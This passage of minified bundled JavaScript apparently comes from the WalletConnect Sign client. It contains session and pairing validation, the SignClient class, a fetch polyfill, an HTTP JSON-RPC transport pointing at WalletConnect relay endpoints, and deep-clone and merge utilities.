0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((u=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:u.universal)!==""&&((l=r==null?void 0:r.redirect)==null?void 0:l.universal)!==void 0&&((h=r==null?void 0:r.redirect)==null?void 0:h.universal)!==""&&((d=r==null?void 0:r.redirect)==null?void 0:d.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(r.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),Q(this,"getAppLinkIfEnabled",(r,n)=>{var i;return this.isLinkModeEnabled(r,n)?(i=r==null?void 0:r.redirect)==null?void 0:i.universal:void 0}),Q(this,"handleLinkModeMessage",({url:r})=>{if(!r||!r.includes("wc_ev")||!r.includes("topic"))return;const n=wb(r,"topic")||"",i=decodeURIComponent(wb(r,"wc_ev")||""),s=this.client.session.keys.includes(n);s&&this.client.session.update(n,{transportType:Wt.link_mode}),this.client.core.dispatchEnvelope({topic:n,message:i,sessionExists:s})}),Q(this,"registerLinkModeListeners",async()=>{var r;if(ey()||uo()&&(r=this.client.metadata.redirect)!=null&&r.linkMode){const n=global==null?void 0:global.Linking;if(typeof n<"u"){n.addEventListener("url",this.handleLinkModeMessage,this.client.name);const i=await n.getInitialURL();i&&setTimeout(()=>{this.handleLinkModeMessage({url:i})},50)}}}),Q(this,"shouldSetTVF",(r,n)=>{if(!n||r!=="wc_sessionRequest")return!1;const{request:i}=n;return Object.keys(Uv).includes(i.method)}),Q(this,"getTVFParams",(r,n,i)=>{var s,o;try{const a=n.request.method,c=this.extractTxHashesFromResult(a,i);return Qr(yt({correlationId:r,rpcMethods:[a],chainId:n.chainId},this.isValidContractData(n.request.params)&&{contractAddresses:[(o=(s=n.request.params)==null?void 0:s[0])==null?void 0:o.to]}),{txHashes:c})}catch(a){this.client.logger.warn("Error getting TVF params",a)}return{}}),Q(this,"isValidContractData",r=>{var n;if(!r)return!1;try{const i=(r==null?void 0:r.data)||((n=r==null?void 0:r[0])==null?void 0:n.data);if(!i.startsWith("0x"))return!1;const s=i.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),Q(this,"extractTxHashesFromResult",(r,n)=>{try{const i=Uv[r];if(typeof n=="string")return[n];const s=n[i.key];if(Js(s))return r==="solana_signAllTransactions"?s.map(o=>b5(o)):s;if(typeof s=="string")return[s]}catch(i){this.client.logger.warn("Error extracting tx hashes from result",i)}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,r=this.client.core.relayer.messages.getWithoutAck(e);for(const[n,i]of Object.entries(r))for(const s of i)try{await this.onProviderMessageEvent({topic:n,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${n}, message: ${s}`)}}catch(e){this.client.logger.warn("processPendingMessageEvents failed",e)}}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(vr.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:r,message:n,attestation:i,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(ud)?this.client.auth.authKeys.get(ud):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(r,n,{receiverPublicKey:o,encoding:s===Wt.link_mode?zs:hi});ly(a)?(this.client.core.history.set(r,a),await this.onRelayEventRequest({topic:r,payload:a,attestation:i,transportType:s,encryptedId:Oi(n)})):Mf(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:r,payload:a,transportType:s}),this.client.core.history.delete(r,a.id)):await this.onRelayEventUnknownPayload({topic:r,payload:a,transportType:s}),await this.client.core.relayer.messages.ack(r,n)}catch(a){this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(qn.expired,async e=>{const{topic:r,id:n}=K_(e.target);if(n&&this.client.pendingRequest.keys.includes(n))return await this.deletePendingSessionRequest(n,oe("EXPIRED"),!0);if(n&&this.client.auth.requests.keys.includes(n))return await this.deletePendingAuthRequest(n,oe("EXPIRED"),!0);r?this.client.session.keys.includes(r)&&(await this.deleteSession({topic:r,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:r})):n&&(await this.deleteProposal(n,!0),this.client.events.emit("proposal_expire",{id:n}))})}registerPairingEvents(){this.client.core.pairing.events.on(Do.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(Do.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!ar(e,!1)){const{message:r}=oe("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(r)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:r}=oe("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(r)}if(Fs(this.client.core.pairing.pairings.get(e).expiry)){const{message:r}=oe("EXPIRED",`pairing topic: ${e}`);throw new Error(r)}}async isValidSessionTopic(e){if(!ar(e,!1)){const{message:r}=oe("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(r)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:r}=oe("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(r)}if(Fs(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:r}=oe("EXPIRED",`session topic: ${e}`);throw new Error(r)}if(!this.client.core.crypto.keychain.has(e)){const{message:r}=oe("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(r)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(ar(e,!1)){const{message:r}=oe("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(r)}else{const{message:r}=oe("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(r)}}async isValidProposalId(e){if(!B8(e)){const{message:r}=oe("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(r)}if(!this.client.proposal.keys.includes(e)){const{message:r}=oe("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(r)}if(Fs(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:r}=oe("EXPIRED",`proposal id: ${e}`);throw new Error(r)}}}class j$ extends Ea{constructor(e,r){super(e,r,I$,hy),this.core=e,this.logger=r}}let q$=class extends Ea{constructor(e,r){super(e,r,x$,hy),this.core=e,this.logger=r}};class z$ extends Ea{constructor(e,r){super(e,r,N$,hy,n=>n.id),this.core=e,this.logger=r}}class H$ extends Ea{constructor(e,r){super(e,r,O$,Uf,()=>ud),this.core=e,this.logger=r}}class W$ extends Ea{constructor(e,r){super(e,r,k$,Uf),this.core=e,this.logger=r}}class G$ extends Ea{constructor(e,r){super(e,r,D$,Uf,n=>n.id),this.core=e,this.logger=r}}var V$=Object.defineProperty,K$=(t,e,r)=>e in t?V$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,dg=(t,e,r)=>K$(t,typeof e!="symbol"?e+"":e,r);class Q${constructor(e,r){this.core=e,this.logger=r,dg(this,"authKeys"),dg(this,"pairingTopics"),dg(this,"requests"),this.authKeys=new H$(this.core,this.logger),this.pairingTopics=new W$(this.core,this.logger),this.requests=new G$(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}}var Y$=Object.defineProperty,J$=(t,e,r)=>e in t?Y$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Fe=(t,e,r)=>J$(t,typeof e!="symbol"?e+"":e,r);let Z$=class tI extends DT{constructor(e){super(e),Fe(this,"protocol",ZC),Fe(this,"version",XC),Fe(this,"name",lg.name),Fe(this,"metadata"),Fe(this,"core"),Fe(this,"logger"),Fe(this,"events",new Vn.EventEmitter),Fe(this,"engine"),Fe(this,"session"),Fe(this,"proposal"),Fe(this,"pendingRequest"),Fe(this,"auth"),Fe(this,"signConfig"),Fe(this,"on",(n,i)=>this.events.on(n,i)),Fe(this,"once",(n,i)=>this.events.once(n,i)),Fe(this,"off",(n,i)=>this.events.off(n,i)),Fe(this,"removeListener",(n,i)=>this.events.removeListener(n,i)),Fe(this,"removeAllListeners",n=>this.events.removeAllListeners(n)),Fe(this,"connect",async n=>{try{return await this.engine.connect(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"pair",async n=>{try{return await this.engine.pair(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"approve",async n=>{try{return await this.engine.approve(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"reject",async n=>{try{return await this.engine.reject(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"update",async n=>{try{return await this.engine.update(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"extend",async n=>{try{return await this.engine.extend(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"request",async n=>{try{return await this.engine.request(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"respond",async n=>{try{return await this.engine.respond(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"ping",async n=>{try{return await this.engine.ping(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"emit",async n=>{try{return await this.engine.emit(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"disconnect",async n=>{try{return await this.engine.disconnect(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"find",n=>{try{return this.engine.find(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(n){throw this.logger.error(n.message),n}}),Fe(this,"authenticate",async(n,i)=>{try{return await this.engine.authenticate(n,i)}catch(s){throw this.logger.error(s.message),s}}),Fe(this,"formatAuthMessage",n=>{try{return this.engine.formatAuthMessage(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"approveSessionAuthenticate",async n=>{try{return await this.engine.approveSessionAuthenticate(n)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"rejectSessionAuthenticate",async n=>{try{return await this.engine.rejectSessionAuthenticate(n)}catch(i){throw this.logger.error(i.message),i}}),this.name=(e==null?void 0:e.name)||lg.name,this.metadata=OD(e==null?void 0:e.metadata),this.signConfig=e==null?void 0:e.signConfig;const r=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Vl(Dc({level:(e==null?void 0:e.logger)||lg.logger}));this.core=(e==null?void 0:e.core)||new C$(e),this.logger=Gr(r,this.name),this.session=new q$(this.core,this.logger),this.proposal=new j$(this.core,this.logger),this.pendingRequest=new z$(this.core,this.logger),this.engine=new F$(this),this.auth=new Q$(this.core,this.logger)}static async init(e){const r=new tI(e);return await r.initialize(),r}get context(){return gn(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success"),setTimeout(()=>{this.engine.processRelayMessageCache()},se.toMiliseconds(se.ONE_SECOND))}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};var Bh={exports:{}},Lv;function X$(){return Lv||(Lv=1,function(t,e){var r=typeof globalThis<"u"&&globalThis||typeof self<"u"&&self||typeof ci<"u"&&ci,n=function(){function s(){this.fetch=!1,this.DOMException=r.DOMException}return s.prototype=r,new s}();(function(s){(function(o){var a=typeof s<"u"&&s||typeof self<"u"&&self||typeof ci<"u"&&ci||{},c={searchParams:"URLSearchParams"in a,iterable:"Symbol"in a&&"iterator"in Symbol,blob:"FileReader"in a&&"Blob"in a&&function(){try{return new Blob,!0}catch{return!1}}(),formData:"FormData"in a,arrayBuffer:"ArrayBuffer"in a};function u(p){return p&&DataView.prototype.isPrototypeOf(p)}if(c.arrayBuffer)var l=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],h=ArrayBuffer.isView||function(p){return p&&l.indexOf(Object.prototype.toString.call(p))>-1};function d(p){if(typeof p!="string"&&(p=String(p)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(p)||p==="")throw new TypeError('Invalid character in header field name: "'+p+'"');return p.toLowerCase()}function g(p){return typeof p!="string"&&(p=String(p)),p}function y(p){var w={next:function(){var E=p.shift();return{done:E===void 0,value:E}}};return c.iterable&&(w[Symbol.iterator]=function(){return w}),w}function m(p){this.map={},p instanceof m?p.forEach(function(w,E){this.append(E,w)},this):Array.isArray(p)?p.forEach(function(w){if(w.length!=2)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+w.length);this.append(w[0],w[1])},this):p&&Object.getOwnPropertyNames(p).forEach(function(w){this.append(w,p[w])},this)}m.prototype.append=function(p,w){p=d(p),w=g(w);var E=this.map[p];this.map[p]=E?E+", "+w:w},m.prototype.delete=function(p){delete this.map[d(p)]},m.prototype.get=function(p){return p=d(p),this.has(p)?this.map[p]:null},m.prototype.has=function(p){return this.map.hasOwnProperty(d(p))},m.prototype.set=function(p,w){this.map[d(p)]=g(w)},m.prototype.forEach=function(p,w){for(var E in this.map)this.map.hasOwnProperty(E)&&p.call(w,this.map[E],E,this)},m.prototype.keys=function(){var p=[];return this.forEach(function(w,E){p.push(E)}),y(p)},m.prototype.values=function(){var p=[];return this.forEach(function(w){p.push(w)}),y(p)},m.prototype.entries=function(){var p=[];return this.forEach(function(w,E){p.push([E,w])}),y(p)},c.iterable&&(m.prototype[Symbol.iterator]=m.prototype.entries);function b(p){if(!p._noBody){if(p.bodyUsed)return Promise.reject(new TypeError("Already read"));p.bodyUsed=!0}}function A(p){return new Promise(function(w,E){p.onload=function(){w(p.result)},p.onerror=function(){E(p.error)}})}function _(p){var w=new FileReader,E=A(w);return w.readAsArrayBuffer(p),E}function T(p){var w=new FileReader,E=A(w),x=/charset=([A-Za-z0-9_-]+)/.exec(p.type),R=x?x[1]:"utf-8";return w.readAsText(p,R),E}function P(p){for(var w=new Uint8Array(p),E=new Array(w.length),x=0;x<w.length;x++)E[x]=String.fromCharCode(w[x]);return E.join("")}function S(p){if(p.slice)return p.slice(0);var w=new Uint8Array(p.byteLength);return w.set(new Uint8Array(p)),w.buffer}function C(){return this.bodyUsed=!1,this._initBody=function(p){this.bodyUsed=this.bodyUsed,this._bodyInit=p,p?typeof p=="string"?this._bodyText=p:c.blob&&Blob.prototype.isPrototypeOf(p)?this._bodyBlob=p:c.formData&&FormData.prototype.isPrototypeOf(p)?this._bodyFormData=p:c.searchParams&&URLSearchParams.prototype.isPrototypeOf(p)?this._bodyText=p.toString():c.arrayBuffer&&c.blob&&u(p)?(this._bodyArrayBuffer=S(p.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):c.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(p)||h(p))?this._bodyArrayBuffer=S(p):this._bodyText=p=Object.prototype.toString.call(p):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||(typeof p=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):c.searchParams&&URLSearchParams.prototype.isPrototypeOf(p)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},c.blob&&(this.blob=function(){var p=b(this);if(p)return p;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer){var p=b(this);return p||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}else{if(c.blob)return this.blob().then(_);throw new Error("could not read as ArrayBuffer")}},this.text=function(){var p=b(this);if(p)return p;if(this._bodyBlob)return T(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(P(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},c.formData&&(this.formData=function(){return this.text().then(F)}),this.json=function(){return this.text().then(JSON.parse)},this}var O=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function $(p){var w=p.toUpperCase();return O.indexOf(w)>-1?w:p}function D(p,w){if(!(this instanceof D))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');w=w||{};var E=w.body;if(p instanceof D){if(p.bodyUsed)throw new TypeError("Already read");this.url=p.url,this.credentials=p.credentials,w.headers||(this.headers=new m(p.headers)),this.method=p.method,this.mode=p.mode,this.signal=p.signal,!E&&p._bodyInit!=null&&(E=p._bodyInit,p.bodyUsed=!0)}else this.url=String(p);if(this.credentials=w.credentials||this.credentials||"same-origin",(w.headers||!this.headers)&&(this.headers=new m(w.headers)),this.method=$(w.method||this.method||"GET"),this.mode=w.mode||this.mode||null,this.signal=w.signal||this.signal||function(){if("AbortController"in a){var B=new AbortController;return B.signal}}(),this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&E)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(E),(this.method==="GET"||this.method==="HEAD")&&(w.cache==="no-store"||w.cache==="no-cache")){var x=/([?&])_=[^&]*/;if(x.test(this.url))this.url=this.url.replace(x,"$1_="+new Date().getTime());else{var R=/\?/;this.url+=(R.test(this.url)?"&":"?")+"_="+new Date().getTime()}}}D.prototype.clone=function(){return new D(this,{body:this._bodyInit})};function F(p){var w=new FormData;return p.trim().split("&").forEach(function(E){if(E){var x=E.split("="),R=x.shift().replace(/\+/g," "),B=x.join("=").replace(/\+/g," ");w.append(decodeURIComponent(R),decodeURIComponent(B))}}),w}function j(p){var w=new m,E=p.replace(/\r?\n[\t ]+/g," ");return E.split("\r").map(function(x){return x.indexOf(`
`)===0?x.substr(1,x.length):x}).forEach(function(x){var R=x.split(":"),B=R.shift().trim();if(B){var k=R.join(":").trim();try{w.append(B,k)}catch(v){console.warn("Response "+v.message)}}}),w}C.call(D.prototype);function L(p,w){if(!(this instanceof L))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(w||(w={}),this.type="default",this.status=w.status===void 0?200:w.status,this.status<200||this.status>599)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=this.status>=200&&this.status<300,this.statusText=w.statusText===void 0?"":""+w.statusText,this.headers=new m(w.headers),this.url=w.url||"",this._initBody(p)}C.call(L.prototype),L.prototype.clone=function(){return new L(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new m(this.headers),url:this.url})},L.error=function(){var p=new L(null,{status:200,statusText:""});return p.ok=!1,p.status=0,p.type="error",p};var N=[301,302,303,307,308];L.redirect=function(p,w){if(N.indexOf(w)===-1)throw new RangeError("Invalid status code");return new L(null,{status:w,headers:{location:p}})},o.DOMException=a.DOMException;try{new o.DOMException}catch{o.DOMException=function(w,E){this.message=w,this.name=E;var x=Error(w);this.stack=x.stack},o.DOMException.prototype=Object.create(Error.prototype),o.DOMException.prototype.constructor=o.DOMException}function f(p,w){return new Promise(function(E,x){var R=new D(p,w);if(R.signal&&R.signal.aborted)return x(new o.DOMException("Aborted","AbortError"));var B=new XMLHttpRequest;function k(){B.abort()}B.onload=function(){var V={statusText:B.statusText,headers:j(B.getAllResponseHeaders()||"")};R.url.indexOf("file://")===0&&(B.status<200||B.status>599)?V.status=200:V.status=B.status,V.url="responseURL"in B?B.responseURL:V.headers.get("X-Request-URL");var I="response"in B?B.response:B.responseText;setTimeout(function(){E(new L(I,V))},0)},B.onerror=function(){setTimeout(function(){x(new TypeError("Network request failed"))},0)},B.ontimeout=function(){setTimeout(function(){x(new TypeError("Network request timed out"))},0)},B.onabort=function(){setTimeout(function(){x(new o.DOMException("Aborted","AbortError"))},0)};function v(V){try{return V===""&&a.location.href?a.location.href:V}catch{return V}}if(B.open(R.method,v(R.url),!0),R.credentials==="include"?B.withCredentials=!0:R.credentials==="omit"&&(B.withCredentials=!1),"responseType"in B&&(c.blob?B.responseType="blob":c.arrayBuffer&&(B.responseType="arraybuffer")),w&&typeof w.headers=="object"&&!(w.headers instanceof m||a.Headers&&w.headers instanceof a.Headers)){var M=[];Object.getOwnPropertyNames(w.headers).forEach(function(V){M.push(d(V)),B.setRequestHeader(V,g(w.headers[V]))}),R.headers.forEach(function(V,I){M.indexOf(I)===-1&&B.setRequestHeader(I,V)})}else R.headers.forEach(function(V,I){B.setRequestHeader(I,V)});R.signal&&(R.signal.addEventListener("abort",k),B.onreadystatechange=function(){B.readyState===4&&R.signal.removeEventListener("abort",k)}),B.send(typeof R._bodyInit>"u"?null:R._bodyInit)})}return f.polyfill=!0,a.fetch||(a.fetch=f,a.Headers=m,a.Request=D,a.Response=L),o.Headers=m,o.Request=D,o.Response=L,o.fetch=f,Object.defineProperty(o,"__esModule",{value:!0}),o})({})})(n),n.fetch.ponyfill=!0,delete n.fetch.polyfill;var i=r.fetch?r:n;e=i.fetch,e.default=i.fetch,e.fetch=i.fetch,e.Headers=i.Headers,e.Request=i.Request,e.Response=i.Response,t.exports=e}(Bh,Bh.exports)),Bh.exports}var eL=X$();const Fv=co(eL);var tL=Object.defineProperty,rL=Object.defineProperties,nL=Object.getOwnPropertyDescriptors,jv=Object.getOwnPropertySymbols,iL=Object.prototype.hasOwnProperty,sL=Object.prototype.propertyIsEnumerable,qv=(t,e,r)=>e in t?tL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,zv=(t,e)=>{for(var r in e||(e={}))iL.call(e,r)&&qv(t,r,e[r]);if(jv)for(var r of jv(e))sL.call(e,r)&&qv(t,r,e[r]);return t},Hv=(t,e)=>rL(t,nL(e));const oL={Accept:"application/json","Content-Type":"application/json"},aL="POST",Wv={headers:oL,method:aL},Gv=10;let wi=class{constructor(e,r=!1){if(this.url=e,this.disableProviderPing=r,this.events=new Vn.EventEmitter,this.isAvailable=!1,this.registering=!1,!av(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=r}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e){this.isAvailable||await this.register();try{const r=ys(e),n=await(await Fv(this.url,Hv(zv({},Wv),{body:r}))).json();this.onPayload({data:n})}catch(r){this.onError(e.id,r)}}async register(e=this.url){if(!av(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const r=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=r||this.events.listenerCount("open")>=r)&&this.events.setMaxListeners(r+1),new Promise((n,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return i(new Error("HTTP connection is missing or invalid"));n()})})}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const r=ys({id:1,jsonrpc:"2.0",method:"test",params:[]});await Fv(e,Hv(zv({},Wv),{body:r}))}this.onOpen()}catch(r){const n=this.parseError(r);throw this.events.emit("register_error",n),this.onClose(),n}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const r=typeof e.data=="string"?Zo(e.data):e.data;this.events.emit("payload",r)}onError(e,r){const n=this.parseError(r),i=n.message||n.toString(),s=Df(e,i);this.events.emit("payload",s)}parseError(e,r=this.url){return OC(e,r,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>Gv&&this.events.setMaxListeners(Gv)}};const Vv="error",cL="wss://relay.walletconnect.org",uL="wc",lL="universal_provider",Uh=`${uL}@2:${lL}:`,rI="https://rpc.walletconnect.org/v1/",Ka="generic",hL=`${rI}bundler`,Yn={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};function dL(){}function dy(t){return t==null||typeof t!="object"&&typeof t!="function"}function fy(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)}function fL(t){if(dy(t))return t;if(Array.isArray(t)||fy(t)||t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);const e=Object.getPrototypeOf(t),r=e.constructor;if(t instanceof Date||t instanceof Map||t instanceof Set)return new r(t);if(t instanceof RegExp){const n=new r(t);return n.lastIndex=t.lastIndex,n}if(t instanceof DataView)return new r(t.buffer.slice(0));if(t instanceof Error){const n=new r(t.message);return n.stack=t.stack,n.name=t.name,n.cause=t.cause,n}if(typeof File<"u"&&t instanceof File)return new r([t],t.name,{type:t.type,lastModified:t.lastModified});if(typeof t=="object"){const n=Object.create(e);return Object.assign(n,t)}return t}function Kv(t){return typeof t=="object"&&t!==null}function nI(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function iI(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const pL="[object RegExp]",sI="[object String]",oI="[object Number]",aI="[object Boolean]",cI="[object Arguments]",gL="[object Symbol]",mL="[object Date]",yL="[object Map]",wL="[object Set]",bL="[object Array]",vL="[object ArrayBuffer]",EL="[object Object]",AL="[object DataView]",_L="[object Uint8Array]",CL="[object Uint8ClampedArray]",IL="[object Uint16Array]",xL="[object Uint32Array]",SL="[object Int8Array]",NL="[object Int16Array]",TL="[object Int32Array]",PL="[object Float32Array]",RL="[object Float64Array]";function OL(t,e){return ec(t,void 0,t,new Map,e)}function ec(t,e,r,n=new Map,i=void 0){const s=i==null?void 0:i(t,e,r,n);if(s!=null)return s;if(dy(t))return t;if(n.has(t))return n.get(t);if(Array.isArray(t)){const o=new Array(t.length);n.set(t,o);for(let a=0;a<t.length;a++)o[a]=ec(t[a],a,r,n,i);return Object.hasOwn(t,"index")&&(o.index=t.index),Object.hasOwn(t,"input")&&(o.input=t.input),o}if(t instanceof Date)return new Date(t.getTime());if(t instanceof RegExp){const o=new RegExp(t.source,t.flags);return o.lastIndex=t.lastIndex,o}if(t instanceof Map){const o=new Map;n.set(t,o);for(const[a,c]of t)o.set(a,ec(c,a,r,n,i));return o}if(t instanceof Set){const o=new Set;n.set(t,o);for(const a of t)o.add(ec(a,void 0,r,n,i));return o}if(typeof Buffer<"u"&&Buffer.isBuffer(t))return t.subarray();if(fy(t)){const o=new(Object.getPrototypeOf(t)).constructor(t.length);n.set(t,o);for(let a=0;a<t.length;a++)o[a]=ec(t[a],a,r,n,i);return o}if(t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);if(t instanceof DataView){const o=new DataView(t.buffer.slice(0),t.byteOffset,t.byteLength);return n.set(t,o),Mo(o,t,r,n,i),o}if(typeof File<"u"&&t instanceof File){const o=new File([t],t.name,{type:t.type});return n.set(t,o),Mo(o,t,r,n,i),o}if(t instanceof Blob){const o=new Blob([t],{type:t.type});return n.set(t,o),Mo(o,t,r,n,i),o}if(t instanceof Error){const o=new t.constructor;return n.set(t,o),o.message=t.message,o.name=t.name,o.stack=t.stack,o.cause=t.cause,Mo(o,t,r,n,i),o}if(typeof t=="object"&&kL(t)){const o=Object.create(Object.getPrototypeOf(t));return n.set(t,o),Mo(o,t,r,n,i),o}return t}function Mo(t,e,r=t,n,i){const s=[...Object.keys(e),...nI(e)];for(let o=0;o<s.length;o++){const a=s[o],c=Object.getOwnPropertyDescriptor(t,a);(c==null||c.writable)&&(t[a]=ec(e[a],a,r,n,i))}}function kL(t){switch(iI(t)){case cI:case bL:case vL:case AL:case aI:case mL:case PL:case RL:case SL:case NL:case TL:case yL:case oI:case EL:case pL:case wL:case sI:case gL:case _L:case CL:case IL:case xL:return!0;default:return!1}}function DL(t,e){return OL(t,(r,n,i,s)=>{if(typeof t=="object")switch(Object.prototype.toString.call(t)){case oI:case sI:case aI:{const o=new t.constructor(t==null?void 0:t.valueOf());return Mo(o,t),o}case cI:{const o={};return Mo(o,t),o.length=t.length,o[Symbol.iterator]=t[Symbol.iterator],o}default:return}})}function Qv(t){return DL(t)}function Yv(t){return t!==null&&typeof t=="object"&&iI(t)==="[object Arguments]"}function ML(t){return fy(t)}function BL(t){var r;if(typeof t!="object"||t==null)return!1;if(Object.getPrototypeOf(t)===null)return!0;if(Object.prototype.toString.call(t)!=="[object Object]"){const n=t[Symbol.toStringTag];return n==null||!((r=Object.getOwnPropertyDescriptor(t,Symbol.toStringTag))!=null&&r.writable)?!1:t.toString()===`[object ${n}]`}let e=t;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(t)===e}function UL(t,...e){const r=e.slice(0,-1),n=e[e.length-1];let i=t;for(let s=0;s<r.length;s++){const o=r[s];i=r0(i,o,n,new Map)}return i}function r0(t,e,r,n){if(dy(t)&&(t=Object(t)),e==null||typeof e!="object")return t;if(n.has(e))return fL(n.get(e));if(n.set(e,t),Array.isArray(e)){e=e.slice();for(let 